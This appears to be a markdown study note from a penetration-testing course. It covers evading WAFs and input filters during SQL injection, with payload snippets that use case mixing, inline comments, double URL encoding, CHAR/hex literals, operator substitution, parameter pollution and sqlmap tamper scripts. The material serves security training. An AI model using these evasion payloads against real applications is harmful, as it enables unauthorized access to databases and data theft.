# SQL Injection — WAF Bypass & Filter Evasion

> This file is not a separate "type" of SQLi — it's the layer you add on top of any of
> the previous four types when input filtering or a WAF gets in the way. Treat this as
> your toolbox for when a payload that *should* work gets blocked or sanitized.

---

## 1. Identify What's Filtering You First

Before trying random evasion tricks, figure out **what** is blocking you:
- Does a specific keyword (`UNION`, `SELECT`, `OR`) trigger a block, but the request
  otherwise reaches the app? → Likely a WAF/keyword filter.
- Does the app silently strip certain characters (quotes, spaces) before the query runs?
  → Likely app-level sanitization, not a WAF.
- Does the response come back instantly with a generic "Forbidden" page on bad input? →
  WAF (Cloudflare, AWS WAF, ModSecurity, etc.) sitting in front of the app.

## 2. Case & Encoding Tricks

```sql
-- Case manipulation (bypasses naive case-sensitive keyword blocks)
UnIoN SeLeCt

-- Inline comments to break up blocked keywords (MySQL-specific)
UNI/**/ON SEL/**/ECT

-- URL encoding spaces
%20 → space
%2520 → double-encoded space (for filters that decode twice)

-- Using alternative whitespace
SELECT/**/password/**/FROM/**/users
SELECT%0aTABLE_NAME%0aFROM... -- newline instead of space
```

## 3. Avoiding Blocked Characters

```sql
-- No spaces allowed? Use parentheses-based syntax
SELECT(password)FROM(users)

-- No single quotes allowed? Use CHAR()/hex encoding
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)   -- 'admin' in MySQL
0x61646d696e   -- hex literal for 'admin' in MySQL

-- No equals sign allowed? Use LIKE
' OR username LIKE 'admin'--
```

## 4. Logic Operator Substitution

```sql
-- If "OR" is blocked
' || '1'='1          -- works in Oracle/Postgres as string concat OR logical depending on context
' OR 1=1             -->  ' || 1=1  (Oracle uses || as concat, not logical OR — be careful)

-- If "AND"/"OR" keywords specifically blocked, use symbolic equivalents where DB supports it
&&  for AND (MySQL)
||  for OR  (MySQL, careful: conflicts with concat in other engines)
```

## 5. Comment Style Variations (engine-dependent)

```sql
-- MySQL: --  (needs trailing space), #, /*comment*/
-- MSSQL: --, /*comment*/
-- Oracle/Postgres: --, /*comment*/
```
If a filter blocks `--` specifically, try `#` (MySQL) or just close the query structurally
without needing a comment at all (e.g. by balancing parentheses).

## 6. Second-Layer Encoding (when WAF decodes once, app decodes again)

```
Payload: ' OR 1=1--
Single URL-encode: %27%20OR%201%3D1--
Double URL-encode:  %2527%2520OR%25201%253D1--
```
Useful when the WAF normalizes/decodes input once before inspection, but the underlying
app framework decodes it a second time before hitting the DB layer.

## 7. Using HTTP Parameter Pollution / Alternate Encodings

- Some WAFs only inspect the first occurrence of a duplicated parameter:
  `?id=1&id=' OR 1=1--`
- JSON-based APIs: try injecting through nested JSON values, since some WAF rulesets are
  tuned mainly for traditional form-encoded/query-string patterns and inspect JSON bodies
  less thoroughly.

## 8. Real-World Notes
- On real engagements, WAF bypass is iterative and noisy — every blocked attempt is a
  logged event. Don't brute-force payload variations blindly; observe the WAF's specific
  block page/response code first, since different rulesets block different things, and
  tailor your evasion instead of spraying generic bypass lists.
- A WAF blocking your input does **not** mean the underlying app is safe — it just adds a
  layer. On a real assessment, a WAF bypass finding plus an underlying unparameterized
  query is still a **critical** finding; report both the WAF gap and the root cause.
- `sqlmap` has a `--tamper` script library built specifically for this category
  (`space2comment`, `charencode`, `apostrophemask`, etc.) — worth knowing these exist so
  you're not reinventing them manually under time pressure, but always understand *why*
  a tamper script works before relying on it blindly.
- Modern WAFs (Cloudflare, Akamai) increasingly use behavioral/ML-based detection, not
  just regex — pure encoding tricks are becoming less reliable against those compared to
  older signature-based WAFs (ModSecurity with default OWASP CRS rules).

## 9. PortSwigger Lab
- SQL injection with filter bypass via XML encoding (this lab combines WAF-style filter
  evasion with a structural encoding bypass — good capstone after the other labs)

Continue to → `06_PortSwigger_Labs_Mapping_Cheatsheet.md`
